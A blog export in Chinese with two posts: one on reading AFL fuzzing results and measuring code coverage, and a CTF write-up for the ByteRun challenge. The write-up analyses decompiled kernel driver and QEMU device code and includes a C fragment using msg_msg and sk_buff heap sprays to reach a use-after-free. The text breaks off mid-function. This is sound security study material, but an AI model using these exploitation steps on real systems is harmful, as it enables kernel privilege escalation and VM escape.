[{"title":"FUZZ(2):AFL结果分析和代码覆盖率","url":"/2023/03/23/AFL%E7%BB%93%E6%9E%9C%E5%88%86%E6%9E%90%E5%92%8C%E4%BB%A3%E7%A0%81%E8%A6%86%E7%9B%96%E7%8E%87/","content":"本来不打算做AFL的源码分析，但是看到了一篇文章吸引到了我，当然这篇文章还是不会涉及到源码分析，在后续的FUZZ相关文章中会进行进一步分析。\nfuzzer工作状态首先可以查看在output目录下的fuzzer_state文件：\n➜  afl-2.52b cat ./afl_test/output_dir/fuzzer_statsstart_time        : 1679542022last_update       : 1679542022fuzzer_pid        : 541718cycles_done       : 0execs_done        : 24execs_per_sec     : 387.10paths_total       : 3paths_favored     : 2paths_found       : 0paths_imported    : 0max_depth         : 1cur_path          : 0pending_favs      : 2pending_total     : 3variable_paths    : 0stability         : 100.00%bitmap_cvg        : 0.05%unique_crashes    : 0unique_hangs      : 0last_path         : 0last_crash        : 0last_hang         : 0execs_since_crash : 24exec_timeout      : 20afl_banner        : testafl_version       : 2.52btarget_mode       : qemu command_line      : ./afl-fuzz -i ./afl_test/input_dir -o ./afl_test/output_dir -Q ./afl_test/test\n\n不过这里我在运行时cat几次内容都没有发生变化所以我猜测应该是运行开始时产生，运行结束时才修改内容。那么如果想要实时的查看运行情况的话可以用afl-whatsup。\n➜  afl-2.52b ./afl-whatsup ./afl_teststatus check tool for afl-fuzz by &lt;lcamtuf@google.com&gt;Individual fuzzers==================&gt;&gt;&gt; test (0 days, 0 hrs) &lt;&lt;&lt;  cycle 1, lifetime speed 2 execs/sec, path 0/3 (0%)  pending 2/3, coverage 0.05%, no crashes yetSummary stats=============       Fuzzers alive : 1      Total run time : 0 days, 0 hours         Total execs : 0 million    Cumulative speed : 2 execs/sec       Pending paths : 2 faves, 3 total       Crashes found : 0 locally unique➜  afl-2.52b ./afl-whatsup ./afl_teststatus check tool for afl-fuzz by &lt;lcamtuf@google.com&gt;Individual fuzzers==================&gt;&gt;&gt; test (0 days, 0 hrs) &lt;&lt;&lt;  cycle 96, lifetime speed 1480 execs/sec, path 3/4 (75%)  pending 0/0, coverage 0.05%, crash count 3 (!)Summary stats=============       Fuzzers alive : 1      Total run time : 0 days, 0 hours         Total execs : 0 million    Cumulative speed : 1480 execs/sec       Pending paths : 0 faves, 0 total       Crashes found : 3 locally unique\n\n虽然但是，我感觉我这里好像使用有问题，但是先不管那么多了。\n再简单介绍一下afl-plot，这个工具总结出来的内容更为直观，可以直接图形化显示。这里存在一定依赖问题\napt-get install gnuplotafl-plot afl_state_dir graph_output_dir\n\n下面就是输出出来的结果，但是不知道为什么这里的total paths没有显示，我猜测可能是因为这里不是使用afl-gcc进行编译或者就是我的电脑性能太拉了。这里的uniq crashes开始在增加随后逐渐趋于平稳。最后一个就是执行速度，随着时间的推移也是越来越慢了，当然也可能是因为占用了太多的系统资源。\n然后再说说pythia插件吧，这个插件可以看到发现新的crash和path的概率。他与原版也只是差了几个字段。\n\n这里在process timing里面框中出现了两个新的字段分别是correctiness和fuzzability，他们的含义分别是在没有发现crash时，发现一个导致crash输入的概率，表示在该程序中发现新路径的难度，该数值越高代表程序越容易Fuzz。在overall results框中也多了两个，第一个是当前发现的路径，一个是路径覆盖率。\n何时关闭fuzz用过就能知道的是fuzz其实是无限执行下去的，这里可以用上面的几种方法来观察是否该结束，当然这里也可以直接在原始的AFL中看到何时该结束，注意这里cycles done的颜色，在fuzz的过程中这个颜色是一直会变化的，可以看到上面的图中颜色为紫色，这里为蓝色。所以他的变化顺序为紫色-&gt;黄色-&gt;蓝色-&gt;绿色，当为绿色是就代表很难再找到新的crash了，而这个时候就可以结束了。(下图为蓝色主要是受我电脑性能影响的)\n➜  output_dir tree.├── crashes│   ├── id:000000,sig:06,src:000001,op:havoc,rep:64│   ├── id:000001,sig:11,src:000000,op:flip1,pos:1│   ├── id:000002,sig:11,src:000000,op:havoc,rep:16│   └── README.txt├── fuzz_bitmap├── fuzzer_stats├── hangs├── plot_data└── queue    ├── id:000000,orig:in.txt    ├── id:000001,orig:in1.txt    ├── id:000002,orig:in2.txt    └── id:000003,src:000001,op:arith8,pos:0,val:-27,+cov\n\nqueue：存放所有具有独特执行路径的测试用例。crashes：导致目标接收致命signal而崩溃的独特测试用例。crashes/README.txt：保存了目标执行这些crash文件的命令行参数。hangs：导致目标超时的独特测试用例。fuzzer_stats：afl-fuzz的运行状态。plot_data：用于afl-plot绘图。\n处理测试结果这里只介绍两种方式，一是crashwalk再就是afl-collect\ncrashwalk安装过程这里就不再说了，网上很多，搜搜就有。\n首先这个有两种模式，一是Manual Mode其次就是AFL Mode，他们的命令新式分别如下。\n~/tools/go/bin/cwtriage -root syncdir/fuzzer1/crashes/ -match id -- ~/parse @@~/tools/go/bin/cwtriage -root syncdir -afl\n\n\n这里使用的是第一种方式(用AFL时我这里会出现无法no crash detected错误)。\n可以看到这里的描述中写上了栈溢出漏洞。\nafl-collect这个工具使用命令如下：\npython3 ./afl-collect -j 8 -d crashes.db -e gdb_script ./afl_sync_dir ./collection_dir --  /path/to/target --target-opts\n\n\n结果比上面的更为直观。\n代码覆盖率代码覆盖率是模糊测试中一个极其重要的概念，使用代码覆盖率可以评估和改进测试过程，执行到的代码越多，找到bug的可能性就越大，毕竟，在覆盖的代码中并不能100%发现bug，在未覆盖的代码中却是100%找不到任何bug的，所以本节中就将详细介绍代码覆盖率的相关概念。\n代码覆盖率是一种度量代码的覆盖程度的方式，也就是指源代码中的某行代码是否已执行；对二进制程序，还可将此概念理解为汇编代码中的某条指令是否已执行。其计量方式很多，但无论是GCC的GCOV还是LLVM的SanitizerCoverage，都提供函数（function）、基本块（basic-block）、边界（edge）三种级别的覆盖率检测，更具体的细节可以参考LLVM的官方文档。\n基本块\n只有一个入口点，BB中的指令不是任何跳转指令的目标。\n只有一个退出点，只有最后一条指令使执行流程转移到另一个BB\n\n如下图中的代码就可以被切割为4个基本块，平时我们在IDA图形模式中看到的就是一个一个的基本块\n拿一个程序举例，在ida中每一块就代表一个基本块。\n\n边依旧是上面ida的图，每一条线，也就是每一个箭头就代表一个边。\n元组在AFL中，使用二元组(branch_src, branch_dst)来记录当前基本块 + 前一基本块的信息，从而获取目标的执行流程和代码覆盖情况，伪代码如下：\ncur_location = &lt;COMPILE_TIME_RANDOM&gt;;            //用一个随机数标记当前基本块shared_mem[cur_location ^ prev_location]++;        //将当前块和前一块异或保存到shared_mem[]prev_location = cur_location &gt;&gt; 1;                //cur_location右移1位区分从当前块到当前块的转跳\n\n实际插入的汇编代码，如下图所示，首先保存各种寄存器的值并设置rcx，然后调用__afl_maybe_log，这个方法的内容相当复杂，这里就不展开讲了，但其主要功能就和上面的伪代码相似，用于记录覆盖率，放入一块共享内存中。\n计算代码覆盖率这里计算代码覆盖率主要是介绍两个工具，一是GCOV另一个则是LCOV它是GCOV的前端。\n\n可以看到这里有覆盖率之类的东西，当然也可以在网页中打开\n\n\n点开文件会有更为详细的数据，每行代码前的数字代表被执行的次数，其中红色的代表未执行过的。\n\n参考链接:    https://paper.seebug.org/842/#4-afl-collect\n","categories":["FUZZ"],"tags":["AFL","FUZZ"]},{"title":"ByteRun复现","url":"/2023/04/01/ByteRun%E5%A4%8D%E7%8E%B0/","content":"当初看到墨晚鸢大佬的博客对这道题目的描述的时候就对这道题暗生情愫了，如今终于是得以复现。\n内核分析函数分析这道题目要说难也算难，要说简单那就是说屁话。这道题可以说是从逆向就开始变得不对劲起来。\nvoid __fastcall bytedev_read(__int64 a1, __int64 user_buf)&#123;  unsigned __int64 v2; // rdx  unsigned __int64 a3; // r14  __int64 v4; // rbx  __int64 v5; // r12  unsigned __int32 v6; // eax  __int64 v7; // r13  __int64 idx; // rax  __int64 offset; // rbp  unsigned __int16 *v10; // r8  __int64 read_size; // rdx  unsigned __int64 remaining_size; // rbx  __int64 read_chunk_pos; // r15  __int64 v14; // rax  __int64 v15; // rcx  __int64 v16; // rbp  __int64 v17; // rdx  unsigned __int32 v18; // eax  unsigned __int32 v19; // eax  __int64 v20; // rbx  _WORD *chunk; // [rsp+10h] [rbp-38h]  _fentry__(a1, user_buf);  a3 = v2;  v4 = *(_QWORD *)(a1 + 0xC8);  v5 = v4 + 40;  raw_spin_lock(v4 + 40);  v6 = __indword(*(_QWORD *)(v4 + 0x20));  if ( !v6 )  &#123;    v7 = *(_QWORD *)(a1 + 0xC8);    idx = *(int *)(v7 + 0xB0);    if ( (_DWORD)idx != *(_DWORD *)(v7 + 0xB4) )    &#123;      offset = 0LL;      if ( a3 )      &#123;        while ( 1 )        &#123;          v10 = *(unsigned __int16 **)(v7 + 8 * idx + 0x30);          read_size = v10[1];          remaining_size = *v10 - (unsigned int)read_size;          read_chunk_pos = (__int64)v10 + read_size + 4;          if ( remaining_size &gt; a3 )            remaining_size = a3;                // current_read_size          if ( (remaining_size &amp; 0x80000000) != 0LL )            BUG();          chunk = *(_WORD **)(v7 + 8 * idx + 0x30);          _check_object_size((char *)v10 + read_size + 4, remaining_size, 1LL);          if ( copy_to_user(offset + user_buf, read_chunk_pos, remaining_size) )            break;          a3 -= remaining_size;          offset += remaining_size;          v14 = (unsigned __int16)(remaining_size + chunk[1]);          chunk[1] += remaining_size;          if ( (_WORD)v14 == *chunk )          &#123;            if ( (_WORD)v14 != 0xFFC )              goto LABEL_21;            kfree(chunk);            *(_DWORD *)(v7 + 0xB0) = (*(_DWORD *)(v7 + 0xB0) + 1) % 0x10;          &#125;          if ( a3 )          &#123;            idx = *(int *)(v7 + 0xB0);            if ( (_DWORD)idx != *(_DWORD *)(v7 + 0xB4) )              continue;          &#125;          goto LABEL_21;        &#125;        printk(&amp;unk_F90);      &#125;    &#125;    goto LABEL_21;  &#125;  if ( v6 != 1 )  &#123;    printk(&amp;unk_1038);LABEL_21:    raw_spin_unlock(v5);    return;  &#125;  v15 = *(_QWORD *)(a1 + 0xC8);  v16 = 0x200LL;  if ( a3 &lt;= 0x200 )    v16 = a3;  v17 = *(_QWORD *)(v15 + 0x20);  v18 = __indword(v17);  if ( v18 == 1 )  &#123;    v19 = __indword(v17 + 2);    if ( v19 == 2 )    &#123;      v20 = *(_QWORD *)(v15 + 0x18);      _check_object_size(v20, v16, 1LL);      if ( copy_to_user(user_buf, v20, v16) )        printk(&amp;unk_1010);    &#125;    else    &#123;      printk(&amp;unk_FF0);    &#125;    goto LABEL_21;  &#125;  bytedev_read_cold_14();&#125;\n\n可以看到在驱动的这个read函数中被分为了两块，在下半部分可以看到一直使用的是__indword函数，而这个是对于设备的IO操作，所以下半部分就是对于设备的控制，上半部分则是对于内核中自身的操作。\n__int64 __fastcall bytedev_write(__int64 a1, __int64 a2)&#123;  unsigned __int64 v2; // rdx  unsigned __int64 a3; // rbp  __int64 v4; // rbx  unsigned __int32 v5; // eax  __int64 v6; // r14  int idx; // r9d  int read_idx; // esi  int v9; // eax  __int64 v10; // r15  int v11; // edx  __int64 v12; // rax  unsigned __int64 remaining_size; // rbx  __int64 v14; // rax  _WORD *chunk; // r13  __int64 user_buf; // r12  __int64 write_offset; // rax  __int64 v18; // r13  _DWORD *v19; // rbx  __int64 v20; // rcx  __int64 v21; // rsi  __int64 v22; // rdx  unsigned __int32 v23; // eax  unsigned __int32 v24; // eax  __int64 v25; // rbx  _WORD *v27; // rax  _WORD *v28; // rdx  __int64 v30; // [rsp+8h] [rbp-40h]  int v31; // [rsp+8h] [rbp-40h]  __int64 v32; // [rsp+10h] [rbp-38h]  ((void (*)(void))_fentry__)();  a3 = v2;  v4 = *(_QWORD *)(a1 + 0xC8);  v32 = v4 + 0x28;  raw_spin_lock(v4 + 0x28);  v5 = __indword(*(_QWORD *)(v4 + 0x20));  if ( v5 )  &#123;    if ( v5 == 1 )    &#123;      v20 = 0x200LL;      v21 = *(_QWORD *)(a1 + 0xC8);      if ( a3 &lt;= 0x200 )        v20 = a3;      v22 = *(_QWORD *)(v21 + 0x20);      v10 = v20;      v23 = __indword(v22);      if ( v23 == 1 )      &#123;        v24 = __indword(v22 + 2);        if ( v24 == 2 )        &#123;          v25 = *(_QWORD *)(v21 + 0x18);          _check_object_size(v25, v20, 0LL);          if ( copy_from_user(v25, a2, v10) )          &#123;            v10 = -14LL;            printk(&amp;unk_1090);          &#125;        &#125;        else        &#123;          v10 = -14LL;          printk(&amp;unk_FF0);        &#125;      &#125;      else      &#123;        v10 = -14LL;        printk(&amp;unk_FC0);      &#125;    &#125;    else    &#123;      v10 = -14LL;      printk(&amp;unk_1038);    &#125;  &#125;  else  &#123;    v6 = *(_QWORD *)(a1 + 0xC8);    idx = *(_DWORD *)(v6 + 0xB4);    read_idx = *(_DWORD *)(v6 + 0xB0);    v9 = idx + 1;    if ( (idx + 1) % 16 != read_idx      || (v28 = *(_WORD **)(v6 + 8LL * idx + 0x30)) == 0LL      || (v10 = -14LL, *v28 &lt;= 0xFFBu) )    &#123;      v10 = 0LL;      if ( a3 )      &#123;        while ( 1 )        &#123;          if ( v9 % 16 == read_idx )          &#123;            v27 = *(_WORD **)(v6 + 8LL * idx + 0x30);            if ( v27 )            &#123;              if ( *v27 &gt; 0xFFBu )                break;            &#125;          &#125;          chunk = *(_WORD **)(v6 + 8LL * ((idx + 0xF) % 16) + 0x30);          user_buf = a2 + v10;          if ( chunk &amp;&amp; (write_offset = (unsigned __int16)*chunk, (_WORD)write_offset != 0xFFC) )          &#123;            v11 = (unsigned __int16)write_offset;            v12 = (__int64)chunk + write_offset + 4;            remaining_size = (unsigned int)(0xFFC - v11);            if ( remaining_size &gt; a3 )              remaining_size = a3;            if ( (remaining_size &amp; 0x80000000) != 0LL )              BUG();            v30 = v12;            _check_object_size(v12, remaining_size, 0LL);            v14 = copy_from_user(v30, user_buf, remaining_size);            if ( v14 )            &#123;              v10 = v14;              printk(&amp;unk_1060);              break;            &#125;            *chunk += remaining_size;            a3 -= remaining_size;            v10 += remaining_size;          &#125;          else          &#123;            v31 = idx;            v18 = 0xFFCLL;            v19 = (_DWORD *)kmem_cache_alloc_trace(kmalloc_caches[26], 0x400CC0LL, 0x1000LL);            *(_QWORD *)(v6 + 8LL * v31 + 0x30) = v19;            if ( a3 &lt;= 0xFFC )              v18 = a3;            *(_DWORD *)(v6 + 0xB4) = (*(_DWORD *)(v6 + 0xB4) + 1) % 16;            *v19 = 0;            _check_object_size(v19 + 1, v18, 0LL);            if ( copy_from_user(v19 + 1, user_buf, v18) )              return ((__int64 (*)(void))bytedev_write_cold_15)();            a3 -= v18;            *(_WORD *)v19 += v18;            v10 += v18;          &#125;          if ( !a3 )            break;          idx = *(_DWORD *)(v6 + 0xB4);          read_idx = *(_DWORD *)(v6 + 0xB0);          v9 = idx + 1;        &#125;      &#125;    &#125;  &#125;  raw_spin_unlock(v32);  return v10;&#125;\n\n这里write的做法跟read类似，依旧可以分为两个部分。通过我上面修改的变量名称其实也就可以很好的推断出来实际的结构了\nptr &#123;\t0xC8 : manager_object&#125;manager_object &#123;\t(0x30 + idx * 0x8) : each_data\t0xB0 : read_idx\t0xB4 : write_idx&#125;each_data &#123;\t0x0 : write_size\t0x2 : read_size\t0x4 — 0xfff : content&#125;\n\n也就是类似于上述这样的结构。这里的漏洞主要发生于read中，可以看到在已经读取的size为0xffc时则会free掉响应的object但是，实际的指针并没有被清除，这样也就造成了UAF。\nchunk = *(_WORD **)(v6 + 8LL * ((idx + 0xF) % 16) + 0x30);......if ( chunk &amp;&amp; (write_offset = (unsigned __int16)*chunk, (_WORD)write_offset != 0xFFC) )&#123;  ......&#125;else&#123;\t......  *(_DWORD *)(v6 + 0xB4) = (*(_DWORD *)(v6 + 0xB4) + 1) % 16;\t......&#125;\n\n并且在write函数中虽然在第一次写入的时候会修改write_idx为1但是在第二次调用的时候会加上0xf随即和16取余，而这也就等价于对write_idx减一的操作，也就以为着我们仍然可以对刚创建的object进行使用。不过前提是还需要绕过这个if语句，当然绕过的方式也是十分简单，这里使用sk_buff进行堆喷即可并且如果write_size我们修改为比0xffc大的数字还可造成堆溢出。\n利用分析这里的利用方式依旧采用CVE-2021-22555进行利用，不熟悉的朋友可以去查看我先前对这一利用方法的分析。\n因为利用方法以往已经分析过了所以这里只对如何达到上述利用的条件做分析。\n这里又一次不得不提到一个常用的结构体msg_msg了。\nstruct msg_msg&#123;    struct list_head m_list;    long m_type;    size_t m_ts;    /* message text size */    void *next;     /* struct msg_msgseg *next; */    void *security; /* NULL without SELinux */    /* the actual message follows immediately */&#125;;struct list_head&#123;    struct list_head *next, *prev;&#125;;\n\n然后就是我们熟悉的关于msg_msg和msg_queue之间的结构为一个双向链表结构，并且结合linux源码可以看到寻找消息的过程\nstatic struct msg_msg *find_msg(struct msg_queue *msq, long *msgtyp, int mode)&#123;\tstruct msg_msg *msg, *found = NULL;\tlong count = 0;\tlist_for_each_entry(msg, &amp;msq-&gt;q_messages, m_list) &#123;\t\tif (testmsg(msg, *msgtyp, mode) &amp;&amp;\t\t    !security_msg_queue_msgrcv(&amp;msq-&gt;q_perm, msg, current,\t\t\t\t\t       *msgtyp, mode)) &#123;\t\t\tif (mode == SEARCH_LESSEQUAL &amp;&amp; msg-&gt;m_type != 1) &#123;\t\t\t\t*msgtyp = msg-&gt;m_type - 1;\t\t\t\tfound = msg;\t\t\t&#125; else if (mode == SEARCH_NUMBER) &#123;\t\t\t\tif (*msgtyp == count)\t\t\t\t\treturn msg;\t\t\t&#125; else\t\t\t\treturn msg;\t\t\tcount++;\t\t&#125;\t&#125;\treturn found ?: ERR_PTR(-EAGAIN);&#125;\n\n#define list_for_each_entry(pos, head, member)\t\t\t\t\\\tfor (pos = list_first_entry(head, typeof(*pos), member);\t\\\t     !list_entry_is_head(pos, head, member);\t\t\t\\\t     pos = list_next_entry(pos, member))#define list_first_entry(ptr, type, member) \\\tlist_entry((ptr)-&gt;next, type, member)\n\n可以发现使用next指针进行寻找的，那么根据在vuln driver中存在的漏洞就是堆溢出，所以理所当然的就能够想到通过堆溢出修改紧邻的primary msg_msg结构体的next指针指向随机一个seconday msg_msg即可造成两个指针指向通过一个object的情况。那么如果我们这时通过原本指向的secondary msg_msg的primary msg_msg的msg_queue进行索引去msgrcv的话即可释放掉secondary msg_msg，但是还存在一个被堆溢出修改的primary msg_msg的next指针依旧指向secondary msg_msg那么我们仍然可以通过被破坏的primary msg_msg去索引到已经被free掉的secondary msg_msg。这也就造成了我们所期盼的UAF了。\nfor (int i = 0; i &lt; MSG_QUEUE_NUM; i++)&#123;  *(int *)&amp;primary_msg.mtext[0] = MSG_TAG;  *(int *)&amp;primary_msg.mtext[4] = i;  if (msgsnd(msqid[i], &amp;primary_msg,             sizeof(primary_msg) - 8, 0) &lt; 0)  &#123;    errExit(&quot;failed to send primary msg!&quot;);  &#125;  *(int *)&amp;secondary_msg.mtext[0] = MSG_TAG;  *(int *)&amp;secondary_msg.mtext[4] = i;  if (msgsnd(msqid[i], &amp;secondary_msg,             sizeof(secondary_msg) - 8, 0) &lt; 0)  &#123;    errExit(&quot;failed to send secondary msg!&quot;);  &#125;&#125;for (int i = 0; i &lt; MSG_QUEUE_NUM; i += 1024)&#123;  if (msgrcv(msqid[i], &amp;primary_msg, sizeof(primary_msg) - 8, PRIMARY_MSG_TYPE, 0) &lt; 0)  &#123;    errExit(&quot;failed to receive primary msg!&quot;);  &#125;&#125;memset(buf, 0x84, 0x1000);write(fd, buf, 0xffc);read(fd, buf, 0xffc);memset(buf, 0, 0x1000);*(unsigned short *)buf = 0xffd;for (int i = 0; i &lt; SOCKET_NUM; i++)&#123;  for (int j = 0; j &lt; SK_BUFF_NUM; j++)  &#123;    if (write(sk_sockets[i][0], buf, 0x1000 - 0x140) &lt; 0)    &#123;      errExit(&quot;failed to spray sk_buff!&quot;);    &#125;  &#125;&#125;memset(buf, 0xa0, 0x1000);write(fd, buf, 1);\n\n上述代码就是产生漏洞利用条件的攻击代码片段。\nQEMU分析struct pci_driver &#123;        struct list_head node;        const char *name;        const struct pci_device_id *id_table;         int  (*probe)  (struct pci_dev *dev, const struct pci_device_id *id);   /* New device inserted */        void (*remove) (struct pci_dev *dev);   /* Device removed (NULL if not a hot-plug capable driver) */        int  (*suspend) (struct pci_dev *dev, pm_message_t state);      /* Device suspended */        int  (*suspend_late) (struct pci_dev *dev, pm_message_t state);        int  (*resume_early) (struct pci_dev *dev);        int  (*resume) (struct pci_dev *dev);                   /* Device woken up */        void (*shutdown) (struct pci_dev *dev);        int (*sriov_configure) (struct pci_dev *dev, int num_vfs); /* PF pdev */        const struct pci_error_handlers *err_handler;        struct device_driver    driver;        struct pci_dynids dynids;&#125;;\n\n首先使用_pci_register_driver函数注册一个设备驱动，上述就是对应的结构体\n.data:0000000000001E00 00                            bytedev_driver db    0                  ; DATA XREF: init_module+132↑o.data:0000000000001E00                                                                       ; cleanup_module+2B↑o.data:0000000000001E01 00                            db    0.data:0000000000001E02 00                            db    0.data:0000000000001E03 00                            db    0.data:0000000000001E04 00                            db    0.data:0000000000001E05 00                            db    0.data:0000000000001E06 00                            db    0.data:0000000000001E07 00                            db    0.data:0000000000001E08 00                            db    0.data:0000000000001E09 00                            db    0.data:0000000000001E0A 00                            db    0.data:0000000000001E0B 00                            db    0.data:0000000000001E0C 00                            db    0.data:0000000000001E0D 00                            db    0.data:0000000000001E0E 00                            db    0.data:0000000000001E0F 00                            db    0.data:0000000000001E10 03 0C 00 00 00 00 00 00       dq offset aBytedev                      ; &quot;bytedev&quot;.data:0000000000001E18 00 13 00 00 00 00 00 00       dq offset bytedev_ids.data:0000000000001E20 95 06 00 00 00 00 00 00       dq offset bytedev_pci_probe.data:0000000000001E28 C0 00 00 00 00 00 00 00       dq offset bytedev_pci_remove\n\n在内存中就是这样，在注册函数中会调用bytedev_pci_probe函数\n__int64 __fastcall bytedev_pci_probe(__int64 a1)&#123;  unsigned int v1; // r13d  __int64 v3; // rax  __int64 v4; // rbx  __int64 v5; // rax  __int64 i; // rax  unsigned int v7; // r12d  unsigned __int64 v8; // rax  __int64 v9; // rcx  _DWORD *v10; // rdi  __int64 v12[14]; // [rsp+0h] [rbp-70h] BYREF  _fentry__();  v1 = -12;  v12[8] = __readgsqword(0x28u);  printk(&amp;unk_DC8);  v3 = kmem_cache_alloc_trace(kmalloc_caches[2], 0xDC0LL, 0xB8LL);  if ( v3 )  &#123;    *(_QWORD *)(a1 + 0x148) = v3;    v4 = v3;    v1 = pci_enable_device(a1);    if ( v1 )    &#123;      printk(&amp;unk_DF8);LABEL_31:      kfree(v4);      return v1;    &#125;    if ( (*(_BYTE *)(a1 + 0x3D1) &amp; 2) == 0 )    &#123;      v1 = -19;      printk(&amp;unk_E28);LABEL_30:      pci_disable_device(a1);      goto LABEL_31;    &#125;    if ( (*(_BYTE *)(a1 + 0x411) &amp; 1) == 0 )    &#123;      v1 = -19;      printk(&amp;unk_E70);      goto LABEL_30;    &#125;    v1 = pci_request_regions(a1, &quot;ByteDance-CTFDevice&quot;);    if ( v1 )    &#123;      printk(&amp;unk_EB8);      goto LABEL_30;    &#125;    v5 = pci_ioremap_bar(a1, 0LL);    *(_QWORD *)(v4 + 0x18) = v5;    if ( !v5 )    &#123;      v1 = -12;      printk(&amp;unk_EE0);LABEL_29:      pci_release_regions(a1);      goto LABEL_30;    &#125;    *(_QWORD *)(v4 + 0x20) = *(_QWORD *)(a1 + 0x3F8);    raw_spin_lock(&amp;bytedev_lock_minor_num);    for ( i = 0LL; i != 0x100; ++i )    &#123;      v7 = i;      if ( !bytedev_minor_num[i] )      &#123;        bytedev_minor_num[(int)i] = 1;        goto LABEL_17;      &#125;    &#125;    v7 = -1;LABEL_17:    raw_spin_unlock(&amp;bytedev_lock_minor_num);    if ( v7 == -1 )    &#123;      printk(&amp;unk_F08);LABEL_28:      pci_iounmap(a1, *(_QWORD *)(v4 + 24));      goto LABEL_29;    &#125;    if ( v7 )      snprintf((char *)v12, 0x40uLL, &quot;%s%d&quot;, &quot;bytedev&quot;, v7);    else      v12[0] = 0x76656465747962LL;    v8 = device_create(bytedev_class, 0LL, v7 | (bytedev_major_num &lt;&lt; 20), 0LL, v12);    if ( v8 &gt; 0xFFFFFFFFFFFFF000LL )    &#123;      v1 = v8;      printk(&amp;unk_F30);      bytedev_set_unused_minor_num(v7);      goto LABEL_28;    &#125;    v9 = 32LL;    v10 = (_DWORD *)(v4 + 48);    *(_DWORD *)(v4 + 40) = 0;    while ( v9 )    &#123;      *v10++ = 0;      --v9;    &#125;    *(_QWORD *)(v4 + 8) = a1;    *(_QWORD *)(v4 + 176) = 0LL;    *(_QWORD *)v4 = v8;    *(_DWORD *)(v4 + 16) = v7;    bytedev_arr[v7] = v4;    printk(&amp;unk_F60);  &#125;  return v1;&#125;\n\n函数中使用了pci_request_regions对资源进行了探测和占用，导致如果直接使用用户态程序对PCI设备使用时会失败，这里如果提权成功的话可以通过卸载驱动模块来实现取消对资源的占用从而可以直接在用户态使用PCI设备。不过题目这里的驱动中已经完全包含了对PCI设备的使用。\n__int64 __fastcall bytedev_ioctl(__int64 a1, __int64 a2)&#123;  unsigned int v2; // edx  unsigned int a3; // r13d  __int64 v4; // r12  __int64 v5; // rax  __int64 v6; // rbx  __int64 v7; // rdx  unsigned __int32 v8; // eax  _fentry__(a1, a2);  a3 = v2;  v4 = *(_QWORD *)(a1 + 0xC8);  raw_spin_lock(v4 + 0x28);  if ( (_DWORD)a2 != 0x114514 )  &#123;    if ( (_DWORD)a2 == 0x1919810 )    &#123;      v7 = *(_QWORD *)(v4 + 0x20);      v8 = __indword(v7);      if ( v8 == 1 )      &#123;        __outdword(v7 + 1, a3);        v6 = 0LL;      &#125;      else      &#123;        v6 = -14LL;        printk(&amp;unk_CE8);      &#125;    &#125;    else    &#123;      v6 = -14LL;      printk(&amp;unk_BD1);    &#125;    goto LABEL_8;  &#125;  v5 = *(_QWORD *)(__readgsqword((unsigned int)&amp;current_task) + 0x7C0);  if ( !*(_DWORD *)(v5 + 4) &amp;&amp; !*(_DWORD *)(v5 + 0x14) )  &#123;    __outdword(*(_QWORD *)(v4 + 0x20), a3);    v6 = 0LL;    printk(&amp;unk_CC0);LABEL_8:    raw_spin_unlock(v4 + 0x28);    return v6;  &#125;  return bytedev_ioctl_cold_12();&#125;\n\n首先这里如果你想要使用PCI设备那么你必须保证一点的是ds_0-&gt;regs.mode = 1，因为所有地方都存在这个验证，所以我们首先就需要使用ioctl中__outdword(*(_QWORD *)(v4 + 0x20), a3);语句。这里最好动调一下查看一下*(_QWORD *)(v4 + 0x20)和(unsigned int)&amp;current_task) + 0x7C0到底是什么，结果会发现这里实际就是供我们修改ds_0-&gt;regs.mode的已经会验证当前是否为root权限。\n函数分析struct BYTEPCIDevState&#123;  PCIDevice_0 parent_obj;  BYTEPCIDevRegs_0 regs;  MemoryRegion_0 mmio;  MemoryRegion_0 pmio;  char *blk_mem[256];&#125;;\n\n还是先给一下结构体\nvoid __cdecl byte_dev_pmio_write(void *opaque, hwaddr addr, uint64_t val, unsigned int size)&#123;  int blk_idx; // ebx  BYTEPCIDevState *ds_0; // [rsp+28h] [rbp-18h]  ds_0 = (BYTEPCIDevState *)object_dynamic_cast_assert(                              (Object_0 *)opaque,                              &quot;byte_dev-pci&quot;,                              &quot;../qemu-7.0.0/hw/misc/bytedev.c&quot;,                              0xA3,                              &quot;byte_dev_pmio_write&quot;);  if ( size == 4 )  &#123;    _mm_mfence();    if ( addr )    &#123;      if ( addr == 1 &amp;&amp; ds_0-&gt;regs.blk_status != 1 &amp;&amp; ds_0-&gt;regs.mode == 1 &amp;&amp; (int)val &lt;= 0xFF )      &#123;        ds_0-&gt;regs.blk_idx = val;        ds_0-&gt;regs.blk_status = 1;        if ( !ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx] )        &#123;          blk_idx = ds_0-&gt;regs.blk_idx;          ds_0-&gt;blk_mem[blk_idx] = (char *)g_malloc(0x200LL);        &#125;        ds_0-&gt;regs.blk_status = 2;      &#125;    &#125;    else if ( val &lt;= 1 )    &#123;      ds_0-&gt;regs.mode = val;    &#125;  &#125;&#125;\n\n首先在qemu中的漏洞就出现在这样一个函数中，在对val的类型为int类型，所以可以为负数因为blk_mem为结构体中的一个成员导致可以向上进行溢出。\nvoid __cdecl byte_dev_mmio_write(void *opaque, hwaddr addr, uint64_t val, unsigned int size)&#123;  BYTEPCIDevState *ds_0; // [rsp+28h] [rbp-8h]  ds_0 = (BYTEPCIDevState *)object_dynamic_cast_assert(                              (Object_0 *)opaque,                              &quot;byte_dev-pci&quot;,                              &quot;../qemu-7.0.0/hw/misc/bytedev.c&quot;,                              107,                              &quot;byte_dev_mmio_write&quot;);  if ( ds_0-&gt;regs.mode == 1 &amp;&amp; ds_0-&gt;regs.blk_status == 2 &amp;&amp; size + addr &lt;= 0x200 )  &#123;    if ( size == 2 )    &#123;      *(_WORD *)&amp;ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx][addr] = val;    &#125;    else if ( size &gt; 2 )    &#123;      if ( size == 4 )      &#123;        *(_DWORD *)&amp;ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx][addr] = val;      &#125;      else if ( size == 8 )      &#123;        *(_QWORD *)&amp;ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx][addr] = val;      &#125;    &#125;    else if ( size == 1 )    &#123;      ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx][addr] = val;    &#125;  &#125;&#125;\n\nuint64_t __cdecl byte_dev_mmio_read(void *opaque, hwaddr addr, unsigned int size)&#123;  BYTEPCIDevState *ds_0; // [rsp+28h] [rbp-8h]  ds_0 = (BYTEPCIDevState *)object_dynamic_cast_assert(                              (Object_0 *)opaque,                              &quot;byte_dev-pci&quot;,                              &quot;../qemu-7.0.0/hw/misc/bytedev.c&quot;,                              87,           